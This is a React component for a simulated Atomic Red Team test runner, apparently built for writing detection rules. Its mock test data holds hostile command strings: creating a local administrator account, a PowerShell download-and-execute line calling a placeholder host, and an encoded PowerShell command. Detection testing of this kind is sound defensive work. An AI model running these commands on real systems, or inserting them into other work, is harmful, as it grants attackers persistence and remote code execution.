
import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { PlayCircle, Download, Terminal, FileCode } from "lucide-react";
import { toast } from "@/components/ui/use-toast";

interface AtomicTest {
  id: string;
  name: string;
  description: string;
  techniqueId: string;
  supportedPlatforms: string[];
  executor: {
    name: string;
    command: string;
    elevation_required: boolean;
  };
}

// Mock data - in a real implementation, this would come from the API
const mockAtomicTests: AtomicTest[] = [
  {
    id: "T1078-atomic-1",
    name: "Create local admin account",
    description: "Creates a local admin account on Windows systems for persistence and privilege escalation",
    techniqueId: "T1078",
    supportedPlatforms: ["windows"],
    executor: {
      name: "command_prompt",
      command: "net user attacker password123 /add && net localgroup administrators attacker /add",
      elevation_required: true
    }
  },
  {
    id: "T1059-atomic-1",
    name: "PowerShell Download and Execute",
    description: "Uses PowerShell to download and execute content from a remote source",
    techniqueId: "T1059",
    supportedPlatforms: ["windows"],
    executor: {
      name: "powershell",
      command: "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')\"",
      elevation_required: false
    }
  },
  {
    id: "T1027-atomic-1",
    name: "Obfuscated Files or Information",
    description: "Creates an obfuscated file by base64 encoding a PowerShell command",
    techniqueId: "T1027",
    supportedPlatforms: ["windows"],
    executor: {
      name: "powershell",
      command: "powershell.exe -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAAgAEMAb...",
      elevation_required: false
    }
  }
];

const AtomicTestRunner = () => {
  const [selectedTechnique, setSelectedTechnique] = useState<string>("T1078");
  const [selectedPlatform, setSelectedPlatform] = useState<string>("windows");
  const [selectedTest, setSelectedTest] = useState<AtomicTest | null>(null);
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [testResults, setTestResults] = useState<{
    output: string;
    status: "success" | "failure";
    duration: number;
  } | null>(null);
  
  // Filter tests by selected technique and platform
  const filteredTests = mockAtomicTests.filter(test => 
    test.techniqueId === selectedTechnique && 
    test.supportedPlatforms.includes(selectedPlatform)
  );

  const handleRunTest = () => {
    if (!selectedTest) return;
    
    setIsRunning(true);
    setTestResults(null);
    
    // Simulate test execution
    toast({
      title: "Test Running",
      description: `Executing ${selectedTest.name}...`,
    });
    
    setTimeout(() => {
      // Simulate test completion
      const success = Math.random() > 0.2;
      
      setTestResults({
        output: success 
          ? `[+] Test executed successfully\n[+] Command: ${selectedTest.executor.command}\n[+] Output: Test completed with expected results`
          : `[-] Test execution failed\n[-] Command: ${selectedTest.executor.command}\n[-] Error: Failed to execute with status code 1`,
        status: success ? "success" : "failure",
        duration: Math.floor(Math.random() * 3000) + 500
      });
      
      setIsRunning(false);
      
      toast({
        title: success ? "Test Completed" : "Test Failed",
        description: success 
          ? `Successfully executed ${selectedTest.name}` 
          : `Failed to execute ${selectedTest.name}`,
        variant: success ? "default" : "destructive",
      });
    }, 3000);
  };

  const handleGenerateRule = () => {
    if (!selectedTest) return;
    
    toast({
      title: "Generating Rule",
      description: "Creating Sigma rule based on test execution...",
    });
    
    // Simulate rule generation delay
    setTimeout(() => {
      toast({
        title: "Rule Generated",
        description: "Sigma rule created and added to library",
      });
    }, 2000);
  };

  return (
    <Card className="cyber-card">
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Terminal className="h-5 w-5 text-cyber-primary" />
          Atomic Red Team Test Runner
        </CardTitle>
        <CardDescription>
          Run Atomic Red Team tests to create and validate detection rules
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
          <div>
            <label className="text-sm font-medium mb-2 block">MITRE ATT&CK Technique</label>
            <Select 
              value={selectedTechnique} 
              onValueChange={setSelectedTechnique}
            >
              <SelectTrigger>
                <SelectValue placeholder="Select technique" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="T1078">T1078 - Valid Accounts</SelectItem>
                <SelectItem value="T1059">T1059 - Command and Scripting Interpreter</SelectItem>
                <SelectItem value="T1027">T1027 - Obfuscated Files or Information</SelectItem>
              </SelectContent>
            </Select>
          </div>
          
          <div>
            <label className="text-sm font-medium mb-2 block">Platform</label>
            <Select 
              value={selectedPlatform} 
              onValueChange={setSelectedPlatform}
            >
              <SelectTrigger>
                <SelectValue placeholder="Select platform" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="windows">Windows</SelectItem>
                <SelectItem value="macos">macOS</SelectItem>
                <SelectItem value="linux">Linux</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>
        
        <Separator className="mb-4" />
        
        <div className="space-y-4">
          <h3 className="text-sm font-medium">Available Tests</h3>
          
          <ScrollArea className="h-48 border border-cyber-primary/20 rounded-md">
            <div className="p-2 space-y-2">
              {filteredTests.length > 0 ? (
                filteredTests.map(test => (
                  <div 
                    key={test.id}
                    className={`p-3 border rounded-md cursor-pointer transition-all ${
                      selectedTest?.id === test.id 
                        ? "border-cyber-primary bg-cyber-primary/10" 
                        : "border-cyber-primary/20 hover:border-cyber-primary/50"
                    }`}
                    onClick={() => setSelectedTest(test)}
                  >
                    <div className="flex justify-between items-start">
                      <h4 className="font-medium">{test.name}</h4>
                      <Badge variant="outline">{test.executor.name}</Badge>
                    </div>
                    <p className="text-sm text-gray-400 mt-1">{test.description}</p>
                    {test.executor.elevation_required && (
                      <Badge className="bg-cyber-warning/20 text-cyber-warning border-cyber-warning mt-2">
                        Requires Admin
                      </Badge>
                    )}
                  </div>
                ))
              ) : (
                <div className="p-4 text-center text-gray-400">
                  No tests available for the selected technique and platform
                </div>
              )}
            </div>
          </ScrollArea>
          
          {selectedTest && (
            <div className="border border-cyber-primary/20 rounded-md p-3">
              <h4 className="text-sm font-medium mb-2">Test Command</h4>
              <pre className="bg-black rounded p-2 text-xs overflow-auto text-green-400">
                {selectedTest.executor.command}
              </pre>
            </div>
          )}
          
          {testResults && (
            <div className={`border rounded-md p-3 ${
              testResults.status === "success" 
                ? "border-cyber-success/30 bg-cyber-success/5" 
                : "border-cyber-danger/30 bg-cyber-danger/5"
            }`}>
              <div className="flex justify-between items-start mb-2">
                <h4 className="text-sm font-medium">Test Results</h4>
                <Badge className={
                  testResults.status === "success" 
                    ? "bg-cyber-success" 
                    : "bg-cyber-danger"
                }>
                  {testResults.status === "success" ? "Success" : "Failed"}
                </Badge>
              </div>
              <pre className="bg-black rounded p-2 text-xs overflow-auto h-24 text-gray-300">
                {testResults.output}
              </pre>
              <p className="text-xs text-gray-400 mt-2">
                Duration: {testResults.duration}ms
              </p>
            </div>
          )}
        </div>
      </CardContent>
      <CardFooter className="flex justify-between border-t border-cyber-primary/20 pt-4">
        <Button 
          variant="outline" 
          className="text-cyber-primary border-cyber-primary hover:bg-cyber-primary/10"
          onClick={() => {
            if (selectedTest) {
              toast({
                title: "Test Downloaded",
                description: `${selectedTest.name} downloaded to local scripts`,
              });
            }
          }}
          disabled={!selectedTest}
        >
          <Download className="h-4 w-4 mr-2" />
          Download Test
        </Button>
        
        <div className="space-x-2">
          {testResults?.status === "success" && (
            <Button 
              onClick={handleGenerateRule}
              variant="outline"
              className="bg-cyber-success/10 border-cyber-success text-cyber-success hover:bg-cyber-success/20"
            >
              <FileCode className="h-4 w-4 mr-2" />
              Generate Rule
            </Button>
          )}
          
          <Button 
            onClick={handleRunTest}
            className="bg-cyber-primary hover:bg-cyber-primary/90"
            disabled={!selectedTest || isRunning}
          >
            {isRunning ? (
              <>
                <Terminal className="animate-pulse h-4 w-4 mr-2" />
                Running...
              </>
            ) : (
              <>
                <PlayCircle className="h-4 w-4 mr-2" />
                Run Test
              </>
            )}
          </Button>
        </div>
      </CardFooter>
    </Card>
  );
};

export default AtomicTestRunner;
